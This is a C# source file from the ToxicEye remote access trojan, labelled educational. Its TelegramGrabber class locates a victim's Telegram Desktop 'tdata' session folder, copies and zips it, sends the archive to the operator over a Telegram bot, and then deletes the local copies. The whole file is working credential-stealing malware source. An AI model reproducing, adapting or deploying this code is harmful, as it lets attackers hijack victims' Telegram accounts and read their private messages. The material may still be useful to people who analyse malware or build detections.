/* 
       ^ Author    : LimerBoy
       ^ Name      : ToxicEye-RAT
       ^ Github    : https://github.com/LimerBoy

       > This program is distributed for educational purposes only.
*/

using System;
using System.IO;
using System.Diagnostics;
using System.IO.Compression;

namespace TelegramRAT
{
    internal class TelegramGrabber
    {

        private static bool in_folder = false;

        public static void get()
        {
            string tdataPath;
            // Try get Telegram path by process
            Process[] process = Process.GetProcessesByName("Telegram");
            if (process.Length > 0)
            {
                // Locate tdata
                tdataPath = Path.GetDirectoryName(process[0].MainModule.FileName) + "\\tdata\\";
                telegram.sendText("⚡️ Telegram session found by process. Please wait...");
                // Steal
                steal(tdataPath);
            // Try get Telegram default path
            } else
            {
                // Try to find tdata in Telegram default path
                tdataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata\\";
                if (Directory.Exists(tdataPath))
                {
                    telegram.sendText("⚡️ Telegram session found in default path. Please wait...");
                    steal(tdataPath);
                }
                // tdata not found
                else
                {
                    telegram.sendText("🛠 Telegram default path and process not found");
                }
            }
        }

        private static void steal(string tdata)
        {
            // Paths
            string dirPath = Path.GetDirectoryName(config.InstallPath) + "\\tdata";
            string archivePath = dirPath + ".zip";
            // If not exists
            if (!Directory.Exists(tdata))
            {
                telegram.sendText("🛠 tdata directory not found");
                return;
            }
            // Create dir
            Directory.CreateDirectory(dirPath);
            // Copy all tdata to dir
            CopyAll(tdata, dirPath);
            // Add dir to archive
            ZipFile.CreateFromDirectory(dirPath, archivePath);
            // Send tdata
            telegram.sendFile(archivePath);
            // Remove archive & dir
            File.Delete(archivePath);
            Directory.Delete(dirPath, true);
        }

        private static void CopyAll(string fromDir, string toDir)
        {
            foreach (string s1 in Directory.GetFiles(fromDir))
                CopyFile(s1, toDir);
            foreach (string s in Directory.GetDirectories(fromDir))
                CopyDir(s, toDir);
        }

        private static void CopyFile(string s1, string toDir)
        {
            try
            {
                var fname = Path.GetFileName(s1);
                if (in_folder && !(fname[0] == 'm' || fname[1] == 'a' || fname[2] == 'p'))
                    return;
                var s2 = toDir + "\\" + fname;
                File.Copy(s1, s2);
            }
            catch { }
        }


        private static void CopyDir(string s, string toDir)
        {
            try
            {
                in_folder = true;
                CopyAll(s, toDir + "\\" + Path.GetFileName(s));
                in_folder = false;
            }
            catch { }
        }


    }
}
